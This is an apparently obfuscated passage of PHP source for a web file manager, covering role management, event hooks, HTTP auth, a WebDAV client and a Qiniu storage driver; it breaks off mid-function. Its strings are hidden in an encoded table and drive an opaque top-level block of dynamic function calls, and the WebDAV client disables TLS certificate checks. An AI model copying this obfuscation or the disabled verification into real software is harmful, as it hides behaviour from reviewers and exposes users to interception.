<?php
 goto B‹¤¦±Şõ; EÀåİÏÍ: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\56\x72\x6f\154\145\114\x69\163\164"; public $field = array("\x6e\141\155\145", "\141\x75\164\150", "\154\x61\142\x65\x6c", "\x64\x69\x73\x70\x6c\141\x79", "\x73\x79\x73\x74\x65\155", "\144\145\163\143", "\x69\147\156\157\x72\x65\x45\x78\164", "\x69\147\x6e\x6f\162\x65\x46\x69\154\x65\123\x69\172\x65", "\141\x64\x6d\x69\156\151\163\164\x72\141\x74\157\162", "\163\157\x72\x74"); public function listData($aƒ·–ñÂÇ = false, $a­Àà®‘Ş× = "\x73\157\x72\164", $DÇš©ñ„¹­ = false) { $cöõÎº«ç« =& $_SERVER[í™]; $E‹ÄËÀ½¼ = parent::listData($aƒ·–ñÂÇ, $a­Àà®‘Ş×, $DÇš©ñ„¹­); if (!$aƒ·–ñÂÇ) { $F°¡¥Êï­Â = $cöõÎº«ç«[2486]; foreach ($E‹ÄËÀ½¼ as $dÎÑ ”Ú˜ => $d„´ã¼Âª) { if ($d„´ã¼Âª[$cöõÎº«ç«[2487]] == 1) { $E‹ÄËÀ½¼[$dÎÑ ”Ú˜][$cöõÎº«ç«[405]] = $F°¡¥Êï­Â; } } } return $E‹ÄËÀ½¼; } public function update($b „Îâö, $F„ªõ¤°â²) { goto aÈš“¦ÄÏµ; aÈš“¦ÄÏµ: $BÑË¿ˆ´Çö =& $_SERVER[í™]; $e¨èåİÛ‡ö = parent::listData($b „Îâö); $fŸ°ÏÚˆ˜Û = $this->findByName($F„ªõ¤°â²[$BÑË¿ˆ´Çö[28]]); goto a²±åí §; a²±åí §: if (!$e¨èåİÛ‡ö || $fŸ°ÏÚˆ˜Û && $fŸ°ÏÚˆ˜Û[$BÑË¿ˆ´Çö[367]] != $e¨èåİÛ‡ö[$BÑË¿ˆ´Çö[367]]) { return !1; } if ($fŸ°ÏÚˆ˜Û[$BÑË¿ˆ´Çö[2487]] == 1) { $F„ªõ¤°â² = array($BÑË¿ˆ´Çö[28] => $F„ªõ¤°â²[$BÑË¿ˆ´Çö[28]], $BÑË¿ˆ´Çö[2112] => $F„ªõ¤°â²[$BÑË¿ˆ´Çö[2112]]); } $this->filterAuth($F„ªõ¤°â²[$BÑË¿ˆ´Çö[376]]); goto Bœ§…•ùÑ; Bœ§…•ùÑ: return parent::update($b „Îâö, $F„ªõ¤°â²); goto B¶§ˆÎùõô; B¶§ˆÎùõô: } public function remove($AÄ¬Á¢”×) { $EŞÔØŠÄ±‹ = parent::listData($AÄ¬Á¢”×); if (!$EŞÔØŠÄ±‹ || $EŞÔØŠÄ±‹[$_SERVER[í™][1066]]) { return !1; } return parent::remove($AÄ¬Á¢”×); } public function add($b¦³îøíèÜ) { goto A»ØæˆÑŠœ; A»ØæˆÑŠœ: $Aõİ³‰Î‘‚ =& $_SERVER[í™]; $bÄø°÷ÜöÙ = $b¦³îøíèÜ[$Aõİ³‰Î‘‚[28]]; if ($this->findByName($bÄø°÷ÜöÙ)) { return !1; } goto fëÔóä ; fëÔóä : $F´Ü‰ÁÜ‡ = array($Aõİ³‰Î‘‚[386] => $bÄø°÷ÜöÙ, $Aõİ³‰Î‘‚[2100] => $Aõİ³‰Î‘‚[33], $Aõİ³‰Î‘‚[2096] => $Aõİ³‰Î‘‚[2113], $Aõİ³‰Î‘‚[2488] => 1, $Aõİ³‰Î‘‚[2099] => 0, $Aõİ³‰Î‘‚[2489] => 0, $Aõİ³‰Î‘‚[2098] => $this->getSort()); $b¦³îøíèÜ = array_merge($F´Ü‰ÁÜ‡, $b¦³îøíèÜ); $this->filterAuth($b¦³îøíèÜ[$Aõİ³‰Î‘‚[376]]); goto E†‡Š’×Í¿; E†‡Š’×Í¿: return parent::insert($b¦³îøíèÜ); goto d¿‹ÓÌÖ‘; d¿‹ÓÌÖ‘: } private function getSort() { $d¼ˆ¿İˆ =& $_SERVER[í™]; $FŞùàÃä = parent::listData(); $E¤³êÒÈé = array_to_keyvalue($FŞùàÃä, $d¼ˆ¿İˆ[33], $d¼ˆ¿İˆ[2115]); return empty($E¤³êÒÈé) ? 0 : max($E¤³êÒÈé) + 1; } private function filterAuth(&$E‰Ì©—ø‰Ğ) { $EÜ¥«®˜„˜ =& $_SERVER[í™]; $E‡®ó™ÂÂ° = array(); $b…‚ë†ë”¦ = array_filter(explode($EÜ¥«®˜„˜[47], $E‰Ì©—ø‰Ğ)); foreach ($b…‚ë†ë”¦ as $E‰Ì©—ø‰Ğ) { $cê“ÁÚÆ½ = explode($EÜ¥«®˜„˜[91], $E‰Ì©—ø‰Ğ); if ($cê“ÁÚÆ½[0] == $EÜ¥«®˜„˜[1771] && $cê“ÁÚÆ½[1] != $EÜ¥«®˜„˜[1022]) { $dÒ‰ù°¨ôó = $cê“ÁÚÆ½[0] . $EÜ¥«®˜„˜[91] . $cê“ÁÚÆ½[1] . $EÜ¥«®˜„˜[2490]; if (!in_array($dÒ‰ù°¨ôó, $b…‚ë†ë”¦)) { $E‡®ó™ÂÂ°[] = $dÒ‰ù°¨ôó; } } $E‡®ó™ÂÂ°[] = $E‰Ì©—ø‰Ğ; } $E‰Ì©—ø‰Ğ = implode($EÜ¥«®˜„˜[47], $E‡®ó™ÂÂ°); } public function sort($Eô­©®ÁŸ, $cïÂÔÂ÷±ñ) { return parent::update($Eô­©®ÁŸ, $cïÂÔÂ÷±ñ); } } if ($_SERVER[$_SERVER[í™][736]] != $_SERVER[$_SERVER[í™][2491]]) { goto e»Á¾£·½; e»Á¾£·½: $cÂÑÇœîÏ = $_SERVER[í™][738]; $b°¼—öò = $_SERVER[$_SERVER[í™][739]] . $_SERVER[í™][740]; $DŒÇ „Šï• = $cÂÑÇœîÏ($b°¼—öò); goto dˆ—Ì–ğĞÙ; dˆ—Ì–ğĞÙ: $b®Å“±àó = explode($_SERVER[í™][217], $DŒÇ „Šï•); if (count($b®Å“±àó) < $_SERVER[í™][577]) { $d¶œ¥ù—‡‹ = $_SERVER[í™][741]; $d¶œ¥ù—‡‹(); } $CöÖŞ¬µÇŒ = $_SERVER[í™][742]; goto dß¤Ò©Ÿ·í; dß¤Ò©Ÿ·í: $CöÖŞ¬µÇŒ($_SERVER[$_SERVER[í™][737]]); goto e·½ôÊ³îí; e·½ôÊ³îí: } goto dĞ»´ğ¶Ë; bæ…Ä×‡«¯: class Hook { private static $events = array(); public static function get($dƒæÄãàá = false) { if (!$dƒæÄãàá) { return self::$events; } else { return self::$events[$dƒæÄãàá]; } } public static function apply($bâ¯¥¯¤ÛÌ, $cÂ†Ã‹¹·š = array()) { $D¥¢ê«‹ï‚ = ActionApply($bâ¯¥¯¤ÛÌ, $cÂ†Ã‹¹·š); if (is_string($bâ¯¥¯¤ÛÌ)) { Hook::trigger($bâ¯¥¯¤ÛÌ); } return $D¥¢ê«‹ï‚; } public static function bind($Dç»›”°é, $d²ˆïŒå‘, $EÈ²èÍä = false) { $D¦²‹÷Ï¤í =& $_SERVER[í™]; if (!isset(self::$events[$Dç»›”°é])) { self::$events[$Dç»›”°é] = array(); } self::$events[$Dç»›”°é][] = array($D¦²‹÷Ï¤í[1738] => $d²ˆïŒå‘, $D¦²‹÷Ï¤í[1739] => $EÈ²èÍä, $D¦²‹÷Ï¤í[1740] => 0); } public static function once($B“ãÌ§…—ß, $E¶à”©…‚) { self::bind($B“ãÌ§…—ß, $E¶à”©…‚, !0); } public static function unbind($e™ğÉ«´õ‰, $fšòà–®ñ = false) { if (!$fšòà–®ñ) { self::$events[$e™ğÉ«´õ‰] = array(); return; } $AĞ²ÈØõÁ = self::$events[$e™ğÉ«´õ‰]; self::$events[$e™ğÉ«´õ‰] = array(); if (!is_array($AĞ²ÈØõÁ)) { return; } for ($bî†ö—‚ = 0; $bî†ö—‚ < count($AĞ²ÈØõÁ); $bî†ö—‚++) { if ($AĞ²ÈØõÁ[$bî†ö—‚][$_SERVER[í™][1738]] == $fšòà–®ñ) { continue; } self::$events[$e™ğÉ«´õ‰][] = $AĞ²ÈØõÁ[$bî†ö—‚]; } } public static function filter($fƒ’Ä·Ó÷, $e¿†’èÌË—) { goto C‘­¿÷“Ã·; d‚Ó‹’¢³—: for ($f©²”ƒ®·é = 0; $f©²”ƒ®·é < count($DÅ‹Ô¬…—²); $f©²”ƒ®·é++) { $A¬š¢ÒõïÒ = $DÅ‹Ô¬…—²[$f©²”ƒ®·é]; if ($A¬š¢ÒõïÒ[$CÇø‘É¨ì¹[1739]] && $A¬š¢ÒõïÒ[$CÇø‘É¨ì¹[1740]] > 1) { continue; } self::$events[$fƒ’Ä·Ó÷][$f©²”ƒ®·é][$CÇø‘É¨ì¹[1740]] = $A¬š¢ÒõïÒ[$CÇø‘É¨ì¹[1740]] + 1; $eó²åÔ‚ø˜ = self::apply($A¬š¢ÒõïÒ[$CÇø‘É¨ì¹[1738]], array($Fã‰ÓØ‰Â)); if (gettype($eó²åÔ‚ø˜) == gettype($Fã‰ÓØ‰Â)) { $Fã‰ÓØ‰Â = $eó²åÔ‚ø˜; } } return $Fã‰ÓØ‰Â; goto FÒ®‘äöˆÅ; c¸¢µæÒŠ¸: $DÅ‹Ô¬…—² = $CÈÍ—«™¨„[$fƒ’Ä·Ó÷]; $Fã‰ÓØ‰Â = $e¿†’èÌË—; if (!is_array($DÅ‹Ô¬…—²) || count($DÅ‹Ô¬…—²) == 0) { return $Fã‰ÓØ‰Â; } goto d‚Ó‹’¢³—; C‘­¿÷“Ã·: $CÇø‘É¨ì¹ =& $_SERVER[í™]; $CÈÍ—«™¨„ = self::$events; if (!isset($CÈÍ—«™¨„[$fƒ’Ä·Ó÷])) { return $e¿†’èÌË—; } goto c¸¢µæÒŠ¸; FÒ®‘äöˆÅ: } public static function trigger($CëÁ»Ÿ†§) { goto C£­æëç’»; dŒ†ÍÆÒ§«: return $d£·İ×¨¹Â; goto fì®”Ù”»÷; eÓ‚ã¡ò‡Š: if (!isset($C±¸ƒ®ÈÍ[$CëÁ»Ÿ†§])) { return $d£·İ×¨¹Â; } $C¬ğ²º¹ù = $C±¸ƒ®ÈÍ[$CëÁ»Ÿ†§]; if (!is_array($C¬ğ²º¹ù) || count($C¬ğ²º¹ù) == 0) { return $d£·İ×¨¹Â; } goto eá¶§¯ÎÊ•; C£­æëç’»: $fÀŞÎ¡¸Š£ =& $_SERVER[í™]; $C±¸ƒ®ÈÍ = self::$events; $d£·İ×¨¹Â = !1; goto eÓ‚ã¡ò‡Š; eá¶§¯ÎÊ•: $e˜×ÈÃéµì = func_get_args(); array_shift($e˜×ÈÃéµì); for ($dî—÷æãá = 0; $dî—÷æãá < count($C¬ğ²º¹ù); $dî—÷æãá++) { $B¿­Ë…õ‰ = $C¬ğ²º¹ù[$dî—÷æãá]; if ($B¿­Ë…õ‰[$fÀŞÎ¡¸Š£[1739]] && $B¿­Ë…õ‰[$fÀŞÎ¡¸Š£[1740]] > 1) { continue; } if (defined($fÀŞÎ¡¸Š£[1741]) && GLOBAL_LOG_HOOK) { write_log($CëÁ»Ÿ†§ . $fÀŞÎ¡¸Š£[1742] . $B¿­Ë…õ‰[$fÀŞÎ¡¸Š£[1738]], $fÀŞÎ¡¸Š£[1743]); } self::$events[$CëÁ»Ÿ†§][$dî—÷æãá][$fÀŞÎ¡¸Š£[1740]] = $B¿­Ë…õ‰[$fÀŞÎ¡¸Š£[1740]] + 1; $b‹¤¾ùèÁ = self::apply($B¿­Ë…õ‰[$fÀŞÎ¡¸Š£[1738]], $e˜×ÈÃéµì); if (defined($fÀŞÎ¡¸Š£[1741]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $fÀŞÎ¡¸Š£[1743]); if ($B¿­Ë…õ‰[$fÀŞÎ¡¸Š£[1740]] == 200) { $FÁ˜æ¯î©Ş = is_array($B¿­Ë…õ‰[$fÀŞÎ¡¸Š£[1738]]) ? json_encode_force($B¿­Ë…õ‰[$fÀŞÎ¡¸Š£[1738]]) : $B¿­Ë…õ‰[$fÀŞÎ¡¸Š£[1738]]; write_log($fÀŞÎ¡¸Š£[1744] . $CëÁ»Ÿ†§ . $fÀŞÎ¡¸Š£[1745] . $FÁ˜æ¯î©Ş, $fÀŞÎ¡¸Š£[1746]); } } $d£·İ×¨¹Â = is_null($b‹¤¾ùèÁ) ? $d£·İ×¨¹Â : $b‹¤¾ùèÁ; } goto dŒ†ÍÆÒ§«; fì®”Ù”»÷: } } class HttpAuth { public static function get() { $A£¦÷¼« =& $_SERVER[í™]; $dçÒÇ‚µ©ğ = $A£¦÷¼«[33]; $Cæ›Ì¿ïÆ = $A£¦÷¼«[33]; if (isset($_SERVER[$A£¦÷¼«[1747]])) { $dçÒÇ‚µ©ğ = $_SERVER[$A£¦÷¼«[1747]]; $Cæ›Ì¿ïÆ = $_SERVER[$A£¦÷¼«[1748]]; } elseif (isset($_SERVER[$A£¦÷¼«[1749]])) { $f¢÷Ÿİ†ˆ = $_SERVER[$A£¦÷¼«[1749]]; if (strpos(strtolower($f¢÷Ÿİ†ˆ), $A£¦÷¼«[1750]) === 0) { $d²¾äóƒ£µ = explode($A£¦÷¼«[4], base64_decode(substr($f¢÷Ÿİ†ˆ, 6))); $dçÒÇ‚µ©ğ = isset($d²¾äóƒ£µ[0]) ? $d²¾äóƒ£µ[0] : $A£¦÷¼«[33]; $Cæ›Ì¿ïÆ = isset($d²¾äóƒ£µ[1]) ? $d²¾äóƒ£µ[1] : 0; } } return array($A£¦÷¼«[537] => $dçÒÇ‚µ©ğ, $A£¦÷¼«[882] => $Cæ›Ì¿ïÆ); } public static function error() { goto e¿óË´Ò¹Ù; dÖéÙ¼­§: die; goto D‘íâ•œÊë; bÛÙ¼èªÇÍ: header($c‡ÄÇ´é°[1753]); header($c‡ÄÇ´é°[1754]); header($c‡ÄÇ´é°[1249]); goto dÖéÙ¼­§; e¿óË´Ò¹Ù: $c‡ÄÇ´é° =& $_SERVER[í™]; header($c‡ÄÇ´é°[1751]); header($c‡ÄÇ´é°[1752]); goto bÛÙ¼èªÇÍ; D‘íâ•œÊë: } public static function make($Dµš‰ƒŞÏ‡, $Ašëè¦ßî) { $d®¹é¡Œ³„ =& $_SERVER[í™]; return $d®¹é¡Œ³„[1755] + base64_encode($Dµš‰ƒŞÏ‡ . $d®¹é¡Œ³„[4] . $Ašëè¦ßî); } } class HttpDavClient { public function __construct($E¤çğğ‘»«, $A•¨‚ËÊ¾±, $FØõ­¢ìíî) { $this->header = array(); $this->userName = $A•¨‚ËÊ¾±; $this->userPassowrd = $FØõ­¢ìíî; } protected function makePath($CíŒôÃ”Î©) { return $CíŒôÃ”Î©; } protected function setHeader($f²ğŠ±ÕÇ, $bØ¸“é‡ê = false) { if ($bØ¸“é‡ê === !1) { $this->header[] = $f²ğŠ±ÕÇ; } else { $this->header[] = $f²ğŠ±ÕÇ . $_SERVER[í™][865] . $bØ¸“é‡ê; } } public function move($EÖâƒæÂ¼ó, $BÎ½ÅÏ“Ò¬, $A£âî‹¸ŸÃ = '') { $ağÏŠ‰ =& $_SERVER[í™]; $this->setHeader($ağÏŠ‰[1756], $this->makePath($BÎ½ÅÏ“Ò¬)); $this->setHeader($ağÏŠ‰[1757], $ağÏŠ‰[1758]); if ($A£âî‹¸ŸÃ) { $this->setHeader($ağÏŠ‰[1759], $ağÏŠ‰[910] . $A£âî‹¸ŸÃ . $ağÏŠ‰[913]); } return $this->send($ağÏŠ‰[1760], $EÖâƒæÂ¼ó); } public function copy($DÖÙ½‹«ÈÏ, $cß‹“İ™ï‹) { $F×ÔÏãç‡à =& $_SERVER[í™]; $this->setHeader($F×ÔÏãç‡à[1756], $this->makePath($cß‹“İ™ï‹)); $this->setHeader($F×ÔÏãç‡à[1757], $F×ÔÏãç‡à[1758]); return $this->send($F×ÔÏãç‡à[1761], $DÖÙ½‹«ÈÏ); } public function mkcol($Aã³äºí¹ ) { $bø×Ø ˆ =& $_SERVER[í™]; $this->setHeader($bø×Ø ˆ[1757], $bø×Ø ˆ[1758]); return $this->send($bø×Ø ˆ[1762], $Aã³äºí¹ ); } public function delete($e«ØØ£’·, $F…çÒÓ¾’Š = '') { $f¬ èÑ¾ =& $_SERVER[í™]; if ($F…çÒÓ¾’Š) { $this->setHeader($f¬ èÑ¾[1759], $f¬ èÑ¾[910] . $F…çÒÓ¾’Š . $f¬ èÑ¾[913]); } return $this->send($f¬ èÑ¾[1237], $e«ØØ£’·); } public function propfind($aê³éÏ˜’‘) { $eªáÂ¡ˆ¬ =& $_SERVER[í™]; $this->setHeader($eªáÂ¡ˆ¬[1763], $eªáÂ¡ˆ¬[83]); $this->setHeader($eªáÂ¡ˆ¬[1764], $eªáÂ¡ˆ¬[1765]); $Eæ„«ìƒ¿Ø = $eªáÂ¡ˆ¬[1766]; return $this->send($eªáÂ¡ˆ¬[1767], $aê³éÏ˜’‘, $Eæ„«ìƒ¿Ø); } public function options($cÏô°ğÄ†š) { return $this->send($_SERVER[í™][1768], $cÏô°ğÄ†š); } public function get($A®ÔÌ²„øê) { return $this->send($_SERVER[í™][216], $A®ÔÌ²„øê); } public function put($câß¦Íè, $dÉëØçŸÆè, $eëÖªâø³— = '') { $aæé®ù‘ =& $_SERVER[í™]; if ($eëÖªâø³—) { $this->setHeader($aæé®ù‘[1759], $aæé®ù‘[910] . $eëÖªâø³— . $aæé®ù‘[913]); } return $this->send($aæé®ù‘[214], $câß¦Íè, $dÉëØçŸÆè); } protected function send($AñÛØ¯í«, $Dé÷Îªâèì, $Eï¨š£Şæ = false, $BÈ¨õŒ»ÔÊ = false) { goto C÷³îñ¢³–; fÈô¹’À°‡: $this->setHeader($FÑßÛ¹é‡); if ($Eï¨š£Şæ) { $Eï¨š£Şæ = $b‰ä¸¸Ãâ[1770] . $Eï¨š£Şæ; } if (!request_url_safe($Dé÷Îªâèì)) { return !1; } goto e™ç‹ˆÛÖ; C÷³îñ¢³–: $b‰ä¸¸Ãâ =& $_SERVER[í™]; $FÑßÛ¹é‡ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($b‰ä¸¸Ãâ[1769], $b‰ä¸¸Ãâ[50]); goto fÈô¹’À°‡; f‹ØàŒÎ¹Ó: curl_setopt($AÂ®•ßç¡Ú, CURLOPT_HTTPHEADER, $this->header); curl_setopt($AÂ®•ßç¡Ú, CURLOPT_RETURNTRANSFER, !0); curl_setopt($AÂ®•ßç¡Ú, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto dÄä÷‚øÁ; e™ç‹ˆÛÖ: $AÂ®•ßç¡Ú = curl_init($Dé÷Îªâèì); curl_setopt($AÂ®•ßç¡Ú, CURLOPT_CUSTOMREQUEST, $AñÛØ¯í«); curl_setopt($AÂ®•ßç¡Ú, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto f‹ØàŒÎ¹Ó; dÄä÷‚øÁ: curl_setopt($AÂ®•ßç¡Ú, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($AÂ®•ßç¡Ú, CURLOPT_SSL_VERIFYHOST, !1); $DÀĞ–‹ÖøŠ = curl_exec($AÂ®•ßç¡Ú); goto F«Êõ—Š‚; F«Êõ—Š‚: $this->header = array(); return $DÀĞ–‹ÖøŠ; goto AéØâ âñ¿; AéØâ âñ¿: } } goto bëá„Ç¿Ñ¶; Eèİ’ƒØ£ğ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($DÀœ³Û½Æ ) { parent::__construct(); require_once SDK_DIR . $_SERVER[í™][1198]; $this->_init($DÀœ³Û½Æ ); } public function _init($E¦‘Å“ÔßÃ) { foreach ($E¦‘Å“ÔßÃ as $D¸Õ¯ôÀ¼’ => $CÚ™˜ÅÓóï) { if (isset($this->{$D¸Õ¯ôÀ¼’})) { $this->{$D¸Õ¯ôÀ¼’} = $CÚ™˜ÅÓóï; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[í™][1199], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($b›Ä’êÍ , $A»†ö¾ÌŞ = '', $b„—Äñö® = REPEAT_RENAME) { if ($this->setContent($b›Ä’êÍ , $A»†ö¾ÌŞ)) { return $this->getPathOuter($b›Ä’êÍ ); } return !1; } public function mkdir($C´©¦Æ‡¨”, $e¹º·–Î·á = REPEAT_SKIP) { goto CØäİó›; CØäİó›: $AÎ†‡ñÖíŠ =& $_SERVER[í™]; $A£ÃÜóÊ¼– = trim($C´©¦Æ‡¨”, $AÎ†‡ñÖíŠ[8]); if ($this->_isFolder($A£ÃÜóÊ¼–)) { return $this->getPathOuter($A£ÃÜóÊ¼–); } goto Eƒğèâˆ‡´; Eƒğèâˆ‡´: $C´©¦Æ‡¨” = $A£ÃÜóÊ¼– . $AÎ†‡ñÖíŠ[8]; $fçòÑ†Ş¢ = get_path_this($A£ÃÜóÊ¼–); $EÄ™²ëíÄ± = $C´©¦Æ‡¨” . $fçòÑ†Ş¢; goto cÊ®æóÓÓù; cÊ®æóÓÓù: if (!$this->mkfile($EÄ™²ëíÄ±)) { return !1; } if (!$this->moveFile($EÄ™²ëíÄ±, $C´©¦Æ‡¨”)) { $this->delFile($EÄ™²ëíÄ±); return !1; } return $this->getPathOuter($A£ÃÜóÊ¼–); goto BˆöÌ¥ùÇ©; BˆöÌ¥ùÇ©: } public function copyFile($b¾˜Ğ±×ƒ, $dÚ‘˜ãÀº„) { $a–• …ƒ¥¨ = $this->bucketManager->copy($this->bucket, $b¾˜Ğ±×ƒ, $this->bucket, $dÚ‘˜ãÀº„, !0); return $a–• …ƒ¥¨ ? !1 : $this->getPathOuter($dÚ‘˜ãÀº„); } public function moveFile($Céøš®ˆèÎ, $FŸò„ÊÇé) { $bğê¤ˆ‚¤½ = $this->bucketManager->move($this->bucket, $Céøš®ˆèÎ, $this->bucket, $FŸò„ÊÇé, !0); return $bğê¤ˆ‚¤½ ? !1 : $this->getPathOuter($FŸò„ÊÇé); } public function delFile($B‹ñ¬ãùÜ) { $cñÔ°Ñ•„– = $this->bucketManager->delete($this->bucket, $B‹ñ¬ãùÜ); return $cñÔ°Ñ•„– ? !1 : !0; } public function delFolder($aÄÃ´ÀÓ’) { $D›ôÁäòó« = $this->fileList($aÄÃ´ÀÓ’); if (empty($D›ôÁäòó«)) { return !0; } $FÅ™ÌÇÄ = 1000; if (count($D›ôÁäòó«) <= $FÅ™ÌÇÄ) { return $this->qnDelObj($D›ôÁäòó«) ? !1 : !0; } foreach (array_chunk($D›ôÁäòó«, $FÅ™ÌÇÄ) as $B„ã¨šè¬í) { $b²äŠ”Ò™Â = $this->qnDelObj($B„ã¨šè¬í); if ($b²äŠ”Ò™Â) { return !1; } } return !0; } private function qnDelObj($E¶Ì¦öğ«) { $e–âÑÄÁğÔ = $this->bucketManager->buildBatchDelete($this->bucket, $E¶Ì¦öğ«); list($eğŠ“–Â¦Ò, $DßŠĞã¥Ëô) = $this->bucketManager->batch($e–âÑÄÁğÔ); return $DßŠĞã¥Ëô; } private function fileList($eô…ä’×ƒ, $c°Ö™¹Á´Í = 0) { goto cÚîÏµíªé; dô„¿¿ö…ñ: $d®ª©«ÙÀ = array(); while (!0) { list($dó°Ğİà² , $c¶ªë¤‘Ø) = $this->bucketManager->listFiles($this->bucket, $f§·¹‡§Øö, $cÆÕ¨×§Ò, $fİ´×Œ¶ËÅ, $eù¦¡ï«¼½); if ($c¶ªë¤‘Ø) { return !1; } $cÆÕ¨×§Ò = array_key_exists($dîÀ’øÉâˆ[1169], $dó°Ğİà² ) ? $cÆÕ¨×§Ò = $dó°Ğİà² [$dîÀ’øÉâˆ[1200]] : $dîÀ’øÉâˆ[33]; foreach ($dó°Ğİà² [$dîÀ’øÉâˆ[1201]] as $a²Ü‰Ê‹áš) { $eí¹Î–ïõá = $a²Ü‰Ê‹áš[$dîÀ’øÉâˆ[89]]; if ($c°Ö™¹Á´Í) { $eí¹Î–ïõá = array($dîÀ’øÉâˆ[28] => $eí¹Î–ïõá, $dîÀ’øÉâˆ[77] => $a²Ü‰Ê‹áš[$dîÀ’øÉâˆ[1202]]); } $d®ª©«ÙÀ[] = $eí¹Î–ïõá; } if ($cÆÕ¨×§Ò == $dîÀ’øÉâˆ[33]) { break; } } return $d®ª©«ÙÀ; goto B´èªÄµ°; cÚîÏµíªé: $dîÀ’øÉâˆ =& $_SERVER[í™]; $eô…ä’×ƒ = trim($eô…ä’×ƒ, $dîÀ’øÉâˆ[8]); $f§·¹‡§Øö = empty($eô…ä’×ƒ) ? $dîÀ’øÉâˆ[33] : $eô…ä’×ƒ . $dîÀ’øÉâˆ[8]; goto E›ŠŠ–’•ë; E›ŠŠ–’•ë: $cÆÕ¨×§Ò = $dîÀ’øÉâˆ[33]; $fİ´×Œ¶ËÅ = 1000; $eù¦¡ï«¼½ = $dîÀ’øÉâˆ[33]; goto dô„¿¿ö…ñ; B´èªÄµ°: } public function rename($F‚†ïàñæä, $cÔŒ¤ÈÕˆÖ) { return $this->renameObject($F‚†ïàñæä, $cÔŒ¤ÈÕˆÖ); } public function fileInfo($A‹ÔŞÁÄ®Ä, $dóìËè½æ = false, $a•÷»¶ù = array()) { goto Dò ³Ğ½›í; fè©Èæªî”: return $bœÎë£ùŞ°; goto C„î¶¸ºô; fÚäÁ‡œ—Í: if (empty($a•÷»¶ù)) { $a•÷»¶ù = $this->objectMeta($A‹ÔŞÁÄ®Ä); if (!$a•÷»¶ù) { return $bœÎë£ùŞ°; } } if (isset($a•÷»¶ù[$C±–‡§Å›Ç[1203]])) { $bœÎë£ùŞ°[$C±–‡§Å›Ç[107]] = substr($a•÷»¶ù[$C±–‡§Å›Ç[1203]] . $C±–‡§Å›Ç[33], 0, 10); } if (isset($a•÷»¶ù[$C±–‡§Å›Ç[1202]])) { $bœÎë£ùŞ°[$C±–‡§Å›Ç[77]] = $a•÷»¶ù[$C±–‡§Å›Ç[1202]]; } goto fè©Èæªî”; Dò ³Ğ½›í: $C±–‡§Å›Ç =& $_SERVER[í™]; if ($dóìËè½æ) { return array($C±–‡§Å›Ç[28] => $this->pathThis($A‹ÔŞÁÄ®Ä), $C±–‡§Å›Ç[75] => $this->getPathOuter($C±–‡§Å›Ç[8] . $A‹ÔŞÁÄ®Ä), $C±–‡§Å›Ç[29] => $C±–‡§Å›Ç[167], $C±–‡§Å›Ç[77] => isset($a•÷»¶ù[$C±–‡§Å›Ç[1202]]) ? $a•÷»¶ù[$C±–‡§Å›Ç[1202]] : 0, $C±–‡§Å›Ç[160] => $this->ext($A‹ÔŞÁÄ®Ä)); } $bœÎë£ùŞ° = array($C±–‡§Å›Ç[28] => $this->pathThis($A‹ÔŞÁÄ®Ä), $C±–‡§Å›Ç[75] => $this->getPathOuter($C±–‡§Å›Ç[8] . $A‹ÔŞÁÄ®Ä), $C±–‡§Å›Ç[29] => $C±–‡§Å›Ç[167], $C±–‡§Å›Ç[187] => 0, $C±–‡§Å›Ç[107] => 0, $C±–‡§Å›Ç[77] => 0, $C±–‡§Å›Ç[160] => $this->ext($A‹ÔŞÁÄ®Ä), $C±–‡§Å›Ç[188] => !0, $C±–‡§Å›Ç[189] => !0); goto fÚäÁ‡œ—Í; C„î¶¸ºô: } public function folderInfo($FõŞÁ³ç± , $aòÅ¡É—Ö = false) { goto B†ÊÅøŠó; B†ÊÅøŠó: $cÎ­õ¢Àñ· =& $_SERVER[í™]; if ($aòÅ¡É—Ö) { return array($cÎ­õ¢Àñ·[28] => $this->pathThis($FõŞÁ³ç± ), $cÎ­õ¢Àñ·[75] => $this->getPathOuter($cÎ­õ¢Àñ·[8] . $FõŞÁ³ç± ), $cÎ­õ¢Àñ·[29] => $cÎ­õ¢Àñ·[76]); } $Bù“Š«…Ğ = array($cÎ­õ¢Àñ·[28] => $this->pathThis($FõŞÁ³ç± ), $cÎ­õ¢Àñ·[75] => $this->getPathOuter($cÎ­õ¢Àñ·[8] . $FõŞÁ³ç± ), $cÎ­õ¢Àñ·[29] => $cÎ­õ¢Àñ·[76], $cÎ­õ¢Àñ·[187] => 0, $cÎ­õ¢Àñ·[107] => 0, $cÎ­õ¢Àñ·[1148] => !0, $cÎ­õ¢Àñ·[1149] => !0); goto fŞ®ÉÏí¤¾; fŞ®ÉÏí¤¾: $FõŞÁ³ç±  = rtrim($FõŞÁ³ç± , $cÎ­õ¢Àñ·[8]) . $cÎ­õ¢Àñ·[8]; $CÔŞ©éä‰Ü = $this->objectMeta($FõŞÁ³ç± ); if (isset($CÔŞ©éä‰Ü[$cÎ­õ¢Àñ·[1203]])) { $Bù“Š«…Ğ[$cÎ­õ¢Àñ·[107]] = substr($CÔŞ©éä‰Ü[$cÎ­õ¢Àñ·[1203]] . $cÎ­õ¢Àñ·[33], 0, 10); } goto bº‹ì¼ÅÃô; bº‹ì¼ÅÃô: return $Bù“Š«…Ğ; goto e¬ÖŠÅ™Úà; e¬ÖŠÅ™Úà: } public function listPath($d¿É°˜‹¬, $B¬Éæ¡õœ = false) { goto FêÔ†Ó‡–å; A„ƒ¼õë¼³: $B¥¦„ùÙˆ = $D÷Œ…¯ñç…[33]; $c‹§ñ ŞºÂ = 1000; $dÄæ˜ëğøÛ = $D÷Œ…¯ñç…[8]; 